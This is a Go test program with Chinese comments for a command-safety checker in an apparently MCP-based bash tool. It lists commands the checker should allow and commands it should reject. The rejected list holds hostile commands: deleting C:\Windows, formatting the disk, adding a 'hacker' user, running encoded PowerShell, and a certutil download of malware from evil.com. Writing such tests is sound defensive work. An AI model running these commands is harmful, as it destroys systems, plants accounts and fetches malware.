package main

import (
	"fmt"
	"mcp-bash-tools/internal/security"
)

func main() {
	testCommands := []struct {
		cmd         string
		shouldAllow bool
		desc        string
	}{
		// 应该允许的命令
		{"ls -la node_modules | grep tailwind", true, "管道+grep"},
		{"cd react && pnpm list | grep tailwind", true, "cd+管道"},
		{"cd react && dir", true, "cd+命令"},
		{`cd K:\tailwind\react && pnpm add -D tailwindcss`, true, "cd+pnpm安装"},
		{`cd K:\tailwind\react && npx tailwindcss init -p`, true, "cd+npx"},
		{`cd K:\tailwind\react && pnpm install`, true, "cd+pnpm"},
		{"npm install -g typescript", true, "全局安装npm包"},
		{"pip install requests", true, "pip安装"},
		{"echo hello > output.txt", true, "重定向输出"},
		{"dir | findstr .txt", true, "Windows管道"},
		{"git log | grep commit", true, "git+管道"},
		{"taskkill /f /im notepad.exe", true, "结束进程"},
		{"net view", true, "查看网络"},
		{"reg query HKLM\\Software", true, "查询注册表"},
		{"setx MY_VAR value", true, "设置环境变量"},

		// 应该拒绝的危险命令
		{"del /f /s /q C:\\Windows", false, "递归删除系统目录"},
		{"format C:", false, "格式化磁盘"},
		{"shutdown /s /t 0", false, "立即关机"},
		{"diskpart", false, "磁盘分区工具"},
		{"net user hacker password /add", false, "添加用户"},
		{"powershell -enc base64code", false, "编码命令执行"},
		{"reg delete HKLM\\Software\\Important", false, "删除注册表"},
		{"certutil -urlcache -f http://evil.com/malware.exe", false, "下载恶意文件"},
	}

	fmt.Println("=== 安全检查测试（更宽松策略）===")
	fmt.Println()

	passed := 0
	failed := 0

	for i, test := range testCommands {
		isDangerous := security.IsDangerousCommand(test.cmd)
		isAllowed := !isDangerous

		status := "✅"
		result := "通过"
		if isAllowed != test.shouldAllow {
			status = "❌"
			result = "失败"
			failed++
		} else {
			passed++
		}

		expectedStr := "允许"
		if !test.shouldAllow {
			expectedStr = "拒绝"
		}
		actualStr := "允许"
		if isDangerous {
			actualStr = "拒绝"
		}

		fmt.Printf("%d. %s %s - %s\n", i+1, status, result, test.desc)
		fmt.Printf("   期望: %s | 实际: %s\n", expectedStr, actualStr)
		fmt.Printf("   命令: %s\n\n", test.cmd)
	}

	fmt.Println("=== 测试结果 ===")
	fmt.Printf("通过: %d/%d\n", passed, len(testCommands))
	fmt.Printf("失败: %d/%d\n", failed, len(testCommands))
}
